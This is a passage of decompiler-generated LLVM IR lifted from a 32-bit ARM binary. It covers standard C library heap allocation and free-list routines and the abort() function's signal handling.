  br i1 %v2_151609, label %dec_label_pc_15168, label %dec_label_pc_15100

dec_label_pc_15100:                               ; preds = %dec_label_pc_15160.preheader, %dec_label_pc_1515c
  %v2_15118 = phi i32 [ %v3_1515c, %dec_label_pc_1515c ], [ %v2_150f4, %dec_label_pc_15160.preheader ]
  %v1_15100 = inttoptr i32 %v2_15118 to i32*
  %v2_15100 = load i32, i32* %v1_15100, align 4
  store i32 %v2_15100, i32* @ip, align 4
  %v3_15104 = icmp ult i32 %v2_15100, %v1_15114
  br i1 %v3_15104, label %dec_label_pc_1515c, label %dec_label_pc_1510c

dec_label_pc_1510c:                               ; preds = %dec_label_pc_15100
  %v1_1510c = add i32 %v1_15114, 44
  %v3_15110 = icmp ult i32 %v2_15100, %v1_1510c
  br i1 %v3_15110, label %dec_label_pc_15120, label %.thread._crit_edge

.thread._crit_edge:                               ; preds = %dec_label_pc_1510c
  %v2_15104.le = sub i32 %v2_15100, %v1_15114
  store i32 %v2_15104.le, i32* %v1_15100, align 4
  %v0_1514c.pre = load i32, i32* @ip, align 4
  %v0_15154.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb29

dec_label_pc_15120:                               ; preds = %dec_label_pc_1510c
  %v1_15120 = add i32 %v2_15118, 4
  %v2_15120 = inttoptr i32 %v1_15120 to i32*
  %v3_15120 = load i32, i32* %v2_15120, align 4
  store i32 %v3_15120, i32* %r2.global-to-local, align 4
  %v2_15124 = icmp eq i32 %v3_15120, 0
  br i1 %v2_15124, label %.thread2, label %bb27

bb27:                                             ; preds = %dec_label_pc_15120
  %v2_15128 = add i32 %v2_15118, 8
  %v3_15128 = inttoptr i32 %v2_15128 to i32*
  %v4_15128 = load i32, i32* %v3_15128, align 4
  %v3_1512c = add i32 %v3_15120, 8
  %v4_1512c = inttoptr i32 %v3_1512c to i32*
  store i32 %v4_15128, i32* %v4_1512c, align 4
  %v0_15130.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_15120, %bb27
  %v0_15130 = phi i32 [ %v2_15118, %dec_label_pc_15120 ], [ %v0_15130.pre, %bb27 ]
  %v1_15130 = add i32 %v0_15130, 8
  %v2_15130 = inttoptr i32 %v1_15130 to i32*
  %v3_15130 = load i32, i32* %v2_15130, align 4
  %v1_15134 = add i32 %v0_15130, 4
  %v2_15134 = inttoptr i32 %v1_15134 to i32*
  %v3_15134 = load i32, i32* %v2_15134, align 4
  %v2_15138 = icmp eq i32 %v3_15130, 0
  br i1 %v2_15138, label %.thread5, label %bb28

bb28:                                             ; preds = %.thread2
  %v3_1513c = add i32 %v3_15130, 4
  %v4_1513c = inttoptr i32 %v3_1513c to i32*
  store i32 %v3_15134, i32* %v4_1513c, align 4
  %v1_15144 = load i32, i32* @ip, align 4
  store i32 %v1_15144, i32* %r2.global-to-local, align 4
  br label %bb29

.thread5:                                         ; preds = %.thread2
  %v2_15140 = load i32, i32* %r1.global-to-local, align 4
  %v3_15140 = inttoptr i32 %v2_15140 to i32*
  store i32 %v3_15134, i32* %v3_15140, align 4
  %v1_15148.pre = load i32, i32* @ip, align 4
  store i32 %v1_15148.pre, i32* %r2.global-to-local, align 4
  br label %bb29

bb29:                                             ; preds = %bb28, %.thread._crit_edge, %.thread5
  %v0_15154 = phi i32 [ %v0_15154.pre, %.thread._crit_edge ], [ %v1_15144, %bb28 ], [ %v1_15148.pre, %.thread5 ]
  %v0_1514c = phi i32 [ %v0_1514c.pre, %.thread._crit_edge ], [ %v1_15144, %bb28 ], [ %v1_15148.pre, %.thread5 ]
  %v1_1514c = load i32, i32* %r0.global-to-local, align 4
  %v2_1514c = sub i32 %v1_1514c, %v0_1514c
  %v1_15150 = add i32 %v2_1514c, 12
  store i32 %v1_15150, i32* %r0.global-to-local, align 4
  %v1_15154 = load i32, i32* %r4.global-to-local, align 4
  %v2_15154 = inttoptr i32 %v1_15154 to i32*
  store i32 %v0_15154, i32* %v2_15154, align 4
  %v2_15158 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15158, i32* %r4.global-to-local, align 4
  ret i32 %v1_15150

dec_label_pc_1515c:                               ; preds = %dec_label_pc_15100
  %v1_1515c = add i32 %v2_15118, 4
  %v2_1515c = inttoptr i32 %v1_1515c to i32*
  %v3_1515c = load i32, i32* %v2_1515c, align 4
  store i32 %v3_1515c, i32* %r0.global-to-local, align 4
  %v2_15160 = icmp eq i32 %v3_1515c, 0
  br i1 %v2_15160, label %dec_label_pc_15160.dec_label_pc_15168_crit_edge, label %dec_label_pc_15100

dec_label_pc_15160.dec_label_pc_15168_crit_edge:  ; preds = %dec_label_pc_1515c
  br label %dec_label_pc_15168

dec_label_pc_15168:                               ; preds = %dec_label_pc_15160.dec_label_pc_15168_crit_edge, %dec_label_pc_15160.preheader
  store i32 %v3_150dc, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_1515c, { 1, 2, 0 }
  uselistorder i32 %v0_15130, { 1, 0 }
  uselistorder i32 %v2_15100, { 1, 0, 2, 3 }
  uselistorder i32 %v2_15118, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_15114, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %bb29, { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_15100, { 1, 0 }
  uselistorder label %dec_label_pc_15160.preheader, { 1, 0 }
}

define i32 @__heap_alloc_at(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_15170 = load i32, i32* %arg1, align 4
  store i32 %v2_15170, i32* %ip.global-to-local, align 4
  store i32 %tmp, i32* %lr.global-to-local, align 4
  %v2_151e86 = icmp eq i32 %v2_15170, 0
  br i1 %v2_151e86, label %dec_label_pc_151f0, label %dec_label_pc_1517c

dec_label_pc_1517c:                               ; preds = %entry, %dec_label_pc_151e4
  %v0_151bc = phi i32 [ %v3_151e4, %dec_label_pc_151e4 ], [ %v2_15170, %entry ]
  %v1_1517c = inttoptr i32 %v0_151bc to i32*
  %v2_1517c = load i32, i32* %v1_1517c, align 4
  store i32 %v2_1517c, i32* %r0.global-to-local, align 4
  %v2_15180 = sub i32 %v0_151bc, %v2_1517c
  %v1_15184 = add i32 %v2_15180, 12
  %v3_15188 = icmp uge i32 %v1_15184, %arg2
  %v9_15188 = icmp eq i32 %v1_15184, %arg2
  %v2_1518c = xor i1 %v9_15188, true
  %v3_1518c = and i1 %v3_15188, %v2_1518c
  br i1 %v3_1518c, label %dec_label_pc_151e4, label %dec_label_pc_15190

dec_label_pc_15190:                               ; preds = %dec_label_pc_1517c
  br i1 %v9_15188, label %dec_label_pc_15194, label %dec_label_pc_151f0

dec_label_pc_15194:                               ; preds = %dec_label_pc_15190
  %v1_15194 = add i32 %arg3, 3
  %v1_15198 = and i32 %v1_15194, -4
  store i32 %v1_15198, i32* %r2.global-to-local, align 4
  %v2_1519c = sub i32 %v2_1517c, %v1_15198
  %v3_1519c = icmp ult i32 %v2_1517c, %v1_15198
  br i1 %v3_1519c, label %dec_label_pc_151f0, label %dec_label_pc_151a4

dec_label_pc_151a4:                               ; preds = %dec_label_pc_15194
  %v1_151a4 = add i32 %v1_15198, 44
  %v3_151a8 = icmp ult i32 %v2_1517c, %v1_151a4
  br i1 %v3_151a8, label %.thread2, label %bb

bb:                                               ; preds = %dec_label_pc_151a4
  store i32 %v2_1519c, i32* %v1_1517c, align 4
  %v1_151b4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_151b4, i32* %r0.global-to-local, align 4
  ret i32 %v1_151b4

.thread2:                                         ; preds = %dec_label_pc_151a4
  %v1_151bc = add i32 %v0_151bc, 4
  %v2_151bc = inttoptr i32 %v1_151bc to i32*
  %v3_151bc = load i32, i32* %v2_151bc, align 4
  store i32 %v3_151bc, i32* %r2.global-to-local, align 4
  %v2_151c0 = icmp eq i32 %v3_151bc, 0
  br i1 %v2_151c0, label %.thread3, label %bb17

bb17:                                             ; preds = %.thread2
  %v2_151c4 = add i32 %v0_151bc, 8
  %v3_151c4 = inttoptr i32 %v2_151c4 to i32*
  %v4_151c4 = load i32, i32* %v3_151c4, align 4
  %v3_151c8 = add i32 %v3_151bc, 8
  %v4_151c8 = inttoptr i32 %v3_151c8 to i32*
  store i32 %v4_151c4, i32* %v4_151c8, align 4
  %v0_151cc.pre = load i32, i32* %ip.global-to-local, align 4
  br label %.thread3

.thread3:                                         ; preds = %.thread2, %bb17
  %v0_151cc = phi i32 [ %v0_151bc, %.thread2 ], [ %v0_151cc.pre, %bb17 ]
  %v1_151cc = add i32 %v0_151cc, 8
  %v2_151cc = inttoptr i32 %v1_151cc to i32*
  %v3_151cc = load i32, i32* %v2_151cc, align 4
  store i32 %v3_151cc, i32* %r2.global-to-local, align 4
  %v1_151d0 = add i32 %v0_151cc, 4
  %v2_151d0 = inttoptr i32 %v1_151d0 to i32*
  %v3_151d0 = load i32, i32* %v2_151d0, align 4
  %v2_151d4 = icmp eq i32 %v3_151cc, 0
  br i1 %v2_151d4, label %.thread4, label %bb18

bb18:                                             ; preds = %.thread3
  %v3_151d8 = add i32 %v3_151cc, 4
  %v4_151d8 = inttoptr i32 %v3_151d8 to i32*
  store i32 %v3_151d0, i32* %v4_151d8, align 4
  br label %bb19

.thread4:                                         ; preds = %.thread3
  %v2_151dc = load i32, i32* %lr.global-to-local, align 4
  %v3_151dc = inttoptr i32 %v2_151dc to i32*
  store i32 %v3_151d0, i32* %v3_151dc, align 4
  br label %bb19

bb19:                                             ; preds = %bb18, %.thread4
  %v5_151e0 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v5_151e0

dec_label_pc_151e4:                               ; preds = %dec_label_pc_1517c
  %v1_151e4 = add i32 %v0_151bc, 4
  %v2_151e4 = inttoptr i32 %v1_151e4 to i32*
  %v3_151e4 = load i32, i32* %v2_151e4, align 4
  store i32 %v3_151e4, i32* %ip.global-to-local, align 4
  %v2_151e8 = icmp eq i32 %v3_151e4, 0
  br i1 %v2_151e8, label %dec_label_pc_151e8.dec_label_pc_151f0.loopexit_crit_edge, label %dec_label_pc_1517c

dec_label_pc_151e8.dec_label_pc_151f0.loopexit_crit_edge: ; preds = %dec_label_pc_151e4
  br label %dec_label_pc_151f0

dec_label_pc_151f0:                               ; preds = %dec_label_pc_15194, %entry, %dec_label_pc_151e8.dec_label_pc_151f0.loopexit_crit_edge, %dec_label_pc_15190
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_151e4, { 1, 2, 0 }
  uselistorder i32 %v0_151cc, { 1, 0 }
  uselistorder i32 %v1_15198, { 0, 2, 1, 3 }
  uselistorder i1 %v9_15188, { 1, 0 }
  uselistorder i32 %v2_1517c, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_151bc, { 3, 2, 1, 0, 5, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 0 }
  uselistorder label %dec_label_pc_151f0, { 2, 0, 3, 1 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_1517c, { 1, 0 }
}

define i32 @__heap_link_free_area() local_unnamed_addr {
entry:
  %v0_151f8 = load i32, i32* @r2, align 4
  %v2_151f8 = icmp eq i32 %v0_151f8, 0
  %v0_151fc = load i32, i32* @r3, align 4
  %v1_151fc = load i32, i32* @r1, align 4
  %v2_151fc = add i32 %v1_151fc, 4
  %v3_151fc = inttoptr i32 %v2_151fc to i32*
  store i32 %v0_151fc, i32* %v3_151fc, align 4
  %v0_15200 = load i32, i32* @r2, align 4
  %v1_15200 = load i32, i32* @r1, align 4
  %v2_15200 = add i32 %v1_15200, 8
  %v3_15200 = inttoptr i32 %v2_15200 to i32*
  store i32 %v0_15200, i32* %v3_15200, align 4
  %v1_15208 = load i32, i32* @r1, align 4
  br i1 %v2_151f8, label %.thread, label %bb

bb:                                               ; preds = %entry
  %v2_15204 = load i32, i32* @r2, align 4
  %v3_15204 = add i32 %v2_15204, 4
  %v4_15204 = inttoptr i32 %v3_15204 to i32*
  store i32 %v1_15208, i32* %v4_15204, align 4
  br label %bb1

.thread:                                          ; preds = %entry
  %v2_15208 = load i32, i32* @r0, align 4
  %v3_15208 = inttoptr i32 %v2_15208 to i32*
  store i32 %v1_15208, i32* %v3_15208, align 4
  br label %bb1

bb1:                                              ; preds = %bb, %.thread
  %v0_1520c = load i32, i32* @r3, align 4
  %v2_1520c = icmp eq i32 %v0_1520c, 0
  br i1 %v2_1520c, label %bb3, label %bb2

bb2:                                              ; preds = %bb1
  %v1_15210 = load i32, i32* @r1, align 4
  %v3_15210 = add i32 %v0_1520c, 8
  %v4_15210 = inttoptr i32 %v3_15210 to i32*
  store i32 %v1_15210, i32* %v4_15210, align 4
  br label %bb3

bb3:                                              ; preds = %bb1, %bb2
  %v1_15214 = load i32, i32* @r0, align 4
  ret i32 %v1_15214

; uselistorder directives
  uselistorder i32 %v1_15208, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @__heap_link_free_area_after() local_unnamed_addr {
entry:
  %v0_15218 = load i32, i32* @r2, align 4
  %v2_15218 = icmp eq i32 %v0_15218, 0
  %v1_1521c = load i32, i32* @r1, align 4
  br i1 %v2_15218, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_1521c = load i32, i32* @r0, align 4
  %v3_1521c = inttoptr i32 %v2_1521c to i32*
  store i32 %v1_1521c, i32* %v3_1521c, align 4
  br label %bb2

.thread:                                          ; preds = %entry
  %v3_15220 = add i32 %v0_15218, 4
  %v4_15220 = inttoptr i32 %v3_15220 to i32*
  store i32 %v1_1521c, i32* %v4_15220, align 4
  br label %bb2

bb2:                                              ; preds = %bb, %.thread
  %v0_15224 = load i32, i32* @r2, align 4
  %v1_15224 = load i32, i32* @r1, align 4
  %v2_15224 = add i32 %v1_15224, 8
  %v3_15224 = inttoptr i32 %v2_15224 to i32*
  store i32 %v0_15224, i32* %v3_15224, align 4
  %v1_15228 = load i32, i32* @r0, align 4
  ret i32 %v1_15228

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__heap_free(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_1522c = load i32, i32* @r4, align 4
  store i32 %v3_1522c, i32* %stack_var_-20, align 4
  %v2_15230 = load i32, i32* %arg1, align 4
  store i32 %v2_15230, i32* %r4.global-to-local, align 4
  %v2_15234 = add i32 %arg3, %arg2
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_152502 = icmp eq i32 %v2_15230, 0
  br i1 %v2_152502, label %dec_label_pc_15300, label %dec_label_pc_15240

dec_label_pc_15240:                               ; preds = %entry, %dec_label_pc_15248
  %v0_15290 = phi i32 [ %v0_15298, %dec_label_pc_15248 ], [ 0, %entry ]
  %v0_15298 = phi i32 [ %v3_1524c, %dec_label_pc_15248 ], [ %v2_15230, %entry ]
  %v1_152545.in = phi i32 [ %v3_1524c, %dec_label_pc_15248 ], [ %v2_15230, %entry ]
  %v1_152545 = add i32 %v1_152545.in, 12
  %v3_15240 = icmp ult i32 %v1_152545, %arg2
  br i1 %v3_15240, label %dec_label_pc_15248, label %dec_label_pc_15260

dec_label_pc_15248:                               ; preds = %dec_label_pc_15240
  store i32 %v0_15298, i32* %r6.global-to-local, align 4
  %v1_1524c = add i32 %v0_15298, 4
  %v2_1524c = inttoptr i32 %v1_1524c to i32*
  %v3_1524c = load i32, i32* %v2_1524c, align 4
  store i32 %v3_1524c, i32* %r4.global-to-local, align 4
  %v2_15250 = icmp eq i32 %v3_1524c, 0
  br i1 %v2_15250, label %dec_label_pc_15250.dec_label_pc_15300.loopexit_crit_edge, label %dec_label_pc_15240

dec_label_pc_15260:                               ; preds = %dec_label_pc_15240
  %v1_15260 = inttoptr i32 %v0_15298 to i32*
  %v2_15260 = load i32, i32* %v1_15260, align 4
  store i32 %v2_15260, i32* @ip, align 4
  %v2_15264 = sub i32 %v0_15298, %v2_15260
  %v1_15268 = add i32 %v2_15264, 12
  %v3_1526c = icmp uge i32 %v1_15268, %v2_15234
  %v9_1526c = icmp eq i32 %v1_15268, %v2_15234
  %v2_15270 = xor i1 %v9_1526c, true
  %v3_15270 = and i1 %v3_1526c, %v2_15270
  br i1 %v3_15270, label %dec_label_pc_15300, label %dec_label_pc_15274

dec_label_pc_15274:                               ; preds = %dec_label_pc_15260
  %v2_15274 = add i32 %v2_15260, %arg3
  store i32 %v2_15274, i32* %r7.global-to-local, align 4
  br i1 %v9_1526c, label %dec_label_pc_1527c, label %dec_label_pc_152a8

dec_label_pc_1527c:                               ; preds = %dec_label_pc_15274
  %v2_1527c = icmp eq i32 %v0_15290, 0
  br i1 %v2_1527c, label %dec_label_pc_152f4, label %dec_label_pc_15284

dec_label_pc_15284:                               ; preds = %dec_label_pc_1527c
  %v1_15284 = add i32 %v0_15290, 12
  %v9_15288 = icmp eq i32 %v1_15284, %arg2
  br i1 %v9_15288, label %dec_label_pc_15290, label %dec_label_pc_152f4

dec_label_pc_15290:                               ; preds = %dec_label_pc_15284
  %v1_15290 = inttoptr i32 %v0_15290 to i32*
  %v2_15290 = load i32, i32* %v1_15290, align 4
  %v1_15294 = add i32 %v0_15290, 8
  %v2_15294 = inttoptr i32 %v1_15294 to i32*
  %v3_15294 = load i32, i32* %v2_15294, align 4
  store i32 %v3_15294, i32* @r2, align 4
  store i32 %v0_15298, i32* @r1, align 4
  %v2_1529c = add i32 %v2_15290, %v2_15274
  store i32 %v2_1529c, i32* %r7.global-to-local, align 4
  %v0_152a0 = call i32 @__heap_link_free_area_after()
  br label %dec_label_pc_152f4

dec_label_pc_152a8:                               ; preds = %dec_label_pc_15274
  %v1_152a8 = add i32 %v0_15298, 4
  %v2_152a8 = inttoptr i32 %v1_152a8 to i32*
  %v3_152a8 = load i32, i32* %v2_152a8, align 4
  store i32 %v3_152a8, i32* %r5.global-to-local, align 4
  %v2_152ac = icmp eq i32 %v3_152a8, 0
  br i1 %v2_152ac, label %dec_label_pc_152e0, label %dec_label_pc_152b4

dec_label_pc_152b4:                               ; preds = %dec_label_pc_152a8
  %v1_152b4 = inttoptr i32 %v3_152a8 to i32*
  %v2_152b4 = load i32, i32* %v1_152b4, align 4
  store i32 %v2_152b4, i32* @ip, align 4
  %v2_152b8 = sub i32 %v3_152a8, %v2_152b4
  %v1_152bc = add i32 %v2_152b8, 12
  %v9_152c0 = icmp eq i32 %v2_15234, %v1_152bc
  br i1 %v9_152c0, label %dec_label_pc_152c8, label %dec_label_pc_152e0

dec_label_pc_152c8:                               ; preds = %dec_label_pc_152b4
  store i32 %v0_15290, i32* @r2, align 4
  store i32 %v3_152a8, i32* @r1, align 4
  %v2_152d0 = add i32 %v2_152b4, %v2_15274
  store i32 %v2_152d0, i32* %r7.global-to-local, align 4
  %v0_152d4 = call i32 @__heap_link_free_area_after()
  %v0_152d8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_152d8, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_152f4

dec_label_pc_152e0:                               ; preds = %dec_label_pc_152b4, %dec_label_pc_152a8
  %v2_152e0 = add i32 %v0_15298, %arg3
  store i32 %v2_152e0, i32* %r4.global-to-local, align 4
  store i32 %v3_152a8, i32* @r3, align 4
  store i32 %v0_15290, i32* @r2, align 4
  store i32 %v2_152e0, i32* @r1, align 4
  %v0_152f0 = call i32 @__heap_link_free_area()
  br label %dec_label_pc_152f4

dec_label_pc_152f4:                               ; preds = %dec_label_pc_15284, %dec_label_pc_1527c, %dec_label_pc_152c8, %dec_label_pc_15290, %dec_label_pc_152e0
  %v0_152f4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_152f4, i32* %r5.global-to-local, align 4
  %v0_152f8 = load i32, i32* %r7.global-to-local, align 4
  %v2_152f8 = inttoptr i32 %v0_152f4 to i32*
  store i32 %v0_152f8, i32* %v2_152f8, align 4
  br label %dec_label_pc_15318

dec_label_pc_15250.dec_label_pc_15300.loopexit_crit_edge: ; preds = %dec_label_pc_15248
  br label %dec_label_pc_15300

dec_label_pc_15300:                               ; preds = %entry, %dec_label_pc_15250.dec_label_pc_15300.loopexit_crit_edge, %dec_label_pc_15260
  %v1_15300 = add i32 %v2_15234, -12
  store i32 %v1_15300, i32* %r5.global-to-local, align 4
  %v3_15304 = inttoptr i32 %v1_15300 to i32*
  store i32 %arg3, i32* %v3_15304, align 4
  %v0_15308 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15308, i32* @r3, align 4
  %v0_1530c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1530c, i32* @r2, align 4
  %v0_15310 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_15310, i32* @r1, align 4
  %v0_15314 = call i32 @__heap_link_free_area()
  br label %dec_label_pc_15318

dec_label_pc_15318:                               ; preds = %dec_label_pc_152f4, %dec_label_pc_15300
  %v0_15318 = load i32, i32* %r5.global-to-local, align 4
  %v2_1531c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_1531c, i32* @r4, align 4
  ret i32 %v0_15318

; uselistorder directives
  uselistorder i32 %v3_152a8, { 0, 1, 3, 2, 4, 5 }
  uselistorder i1 %v9_1526c, { 1, 0 }
  uselistorder i32 %v3_1524c, { 2, 3, 1, 0 }
  uselistorder i32 %v0_15298, { 0, 2, 1, 3, 4, 6, 7, 5 }
  uselistorder i32 %v0_15290, { 4, 5, 1, 0, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 ()* @__heap_link_free_area, { 1, 0 }
  uselistorder i32 ()* @__heap_link_free_area_after, { 1, 0 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15318, { 1, 0 }
  uselistorder label %dec_label_pc_15300, { 1, 2, 0 }
  uselistorder label %dec_label_pc_152f4, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_15240, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
dec_label_pc_1533c.lr.ph:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %stack_var_-268 = alloca i32, align 4
  %v2_15320 = ptrtoint i32* %stack_var_-268 to i32
  %v1_15330 = call i32 @__pthread_return_0()
  store i32 31, i32* %r1.global-to-local, align 4
  %v2_1533c = ptrtoint i32* %stack_var_0 to i32
  br label %dec_label_pc_1533c

dec_label_pc_1533c:                               ; preds = %dec_label_pc_1533c.lr.ph, %dec_label_pc_1533c
  %v1_15340 = phi i32 [ 31, %dec_label_pc_1533c.lr.ph ], [ %v1_1534c, %dec_label_pc_1533c ]
  %v4_15340 = mul i32 %v1_15340, 4
  %v5_15340 = add i32 %v4_15340, %v2_1533c
  %v2_15348 = add i32 %v5_15340, -128
  %v3_15348 = inttoptr i32 %v2_15348 to i32*
  store i32 0, i32* %v3_15348, align 4
  %v0_1534c = load i32, i32* %r1.global-to-local, align 4
  %v1_1534c = add i32 %v0_1534c, -1
  store i32 %v1_1534c, i32* %r1.global-to-local, align 4
  %v6_1534c = icmp slt i32 %v1_1534c, 0
  br i1 %v6_1534c, label %dec_label_pc_15354, label %dec_label_pc_1533c

dec_label_pc_15354:                               ; preds = %dec_label_pc_1533c
  %v2_15354 = ptrtoint i32* %stack_var_-128 to i32
  store i32 %v2_15354, i32* @r4, align 4
  store i32 %v2_15354, i32* @r0, align 4
  store i32 6, i32* @r1, align 4
  %v0_15360 = call i32 @__sigaddset()
  %v2_15364 = icmp eq i32 %v0_15360, 0
  br i1 %v2_15364, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_15354
  store i32 %v2_15354, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_15354, %bb
  store i32 86904, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_15364, i32 ptrtoint (i32* @global_var_120a8.1164 to i32))
  %v2_1537c = load i32, i32* @global_var_32b3c.1166, align 4
  %v2_15380 = icmp eq i32 %v2_1537c, 0
  br i1 %v2_15380, label %dec_label_pc_15388, label %dec_label_pc_153b8

dec_label_pc_15388:                               ; preds = %.thread1
  store i32 1, i32* @global_var_32b3c.1166, align 4
  br label %dec_label_pc_15390

dec_label_pc_15390:                               ; preds = %dec_label_pc_15408, %dec_label_pc_15388
  store i32 86944, i32* @lr, align 4
  %v1_1539c = call i32 @__pthread_return_0()
  %v1_153a4 = call i32 @__raise(i32 6)
  store i32 86968, i32* @lr, align 4
  %v1_153b4 = call i32 @__pthread_return_0()
  %v2_153bc.pre = load i32, i32* @global_var_32b3c.1166, align 4
  br label %dec_label_pc_153b8

dec_label_pc_153b8:                               ; preds = %.thread1, %dec_label_pc_15390
  %v0_1542c = phi i32 [ %v2_1537c, %.thread1 ], [ %v2_153bc.pre, %dec_label_pc_15390 ]
  store i32 ptrtoint (i32* @global_var_32b3c.1166 to i32), i32* %ip.global-to-local, align 4
  %v7_153c0 = icmp eq i32 %v0_1542c, 1
  br i1 %v7_153c0, label %dec_label_pc_153f0.lr.ph, label %dec_label_pc_15424

dec_label_pc_153f0.lr.ph:                         ; preds = %dec_label_pc_153b8
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 140, i32* @r2, align 4
  store i32 2, i32* @global_var_32b3c.1166, align 4
  %v2_153dc = bitcast i32* %stack_var_-268 to i8*
  %v3_153dc = call i32 @__GI_memset(i8* %v2_153dc, i32 0)
  store i32 0, i32* %stack_var_-268, align 4
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_153f0

dec_label_pc_153f0:                               ; preds = %dec_label_pc_153f0.lr.ph, %dec_label_pc_153f0
  %v1_153f4 = phi i32 [ 31, %dec_label_pc_153f0.lr.ph ], [ %v1_15400, %dec_label_pc_153f0 ]
  %v4_153f4 = mul i32 %v1_153f4, 4
  %v5_153f4 = add i32 %v4_153f4, %v2_1533c
  %v2_153fc = add i32 %v5_153f4, -264
  %v3_153fc = inttoptr i32 %v2_153fc to i32*
  store i32 -1, i32* %v3_153fc, align 4
  %v0_15400 = load i32, i32* %r1.global-to-local, align 4
  %v1_15400 = add i32 %v0_15400, -1
  store i32 %v1_15400, i32* %r1.global-to-local, align 4
  %v6_15400 = icmp slt i32 %v1_15400, 0
  br i1 %v6_15400, label %dec_label_pc_15408, label %dec_label_pc_153f0

dec_label_pc_15408:                               ; preds = %dec_label_pc_153f0
  store i32 %v2_15320, i32* %r1.global-to-local, align 4
  %v4_1541c = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-268, i32 0)
  br label %dec_label_pc_15390

dec_label_pc_15424:                               ; preds = %dec_label_pc_153b8
  %v7_15424 = icmp eq i32 %v0_1542c, 2
  br i1 %v7_15424, label %dec_label_pc_1542c, label %dec_label_pc_15438

dec_label_pc_1542c:                               ; preds = %dec_label_pc_15424
  store i32 3, i32* @global_var_32b3c.1166, align 4
  %v0_15434 = call i32 @abort()
  %v2_15438.pre = load i32, i32* @global_var_32b3c.1166, align 4
  br label %dec_label_pc_15438

dec_label_pc_15438:                               ; preds = %dec_label_pc_15424, %dec_label_pc_1542c
  %v1_15440 = phi i32 [ %v0_1542c, %dec_label_pc_15424 ], [ %v2_15438.pre, %dec_label_pc_1542c ]
  %v7_1543c = icmp eq i32 %v1_15440, 3
  br i1 %v7_1543c, label %bb27, label %.thread3

bb27:                                             ; preds = %dec_label_pc_15438
  %v2_15448 = load i32, i32* %ip.global-to-local, align 4
  %v3_15448 = inttoptr i32 %v2_15448 to i32*
  store i32 4, i32* %v3_15448, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_15438, %bb27
  call void @__pseudo_cond_branch(i1 %v7_1543c, i32 ptrtoint (i32* @global_var_11c94.1168 to i32))
  br label %dec_label_pc_15450

dec_label_pc_15450:                               ; preds = %dec_label_pc_15450, %.thread3
  %v0_15450 = call i32 @abort()
  br label %dec_label_pc_15450

; uselistorder directives
  uselistorder i32 %v1_15400, { 2, 1, 0 }
  uselistorder i32 %v1_1534c, { 2, 1, 0 }
  uselistorder i32* %stack_var_-268, { 1, 2, 0, 3 }
  uselistorder i32* %r1.global-to-local, { 8, 3, 0, 1, 4, 5, 7, 6, 2 }
  uselistorder i32* @global_var_32b3c.1166, { 1, 2, 0, 6, 3, 4, 5 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_15438, { 1, 0 }
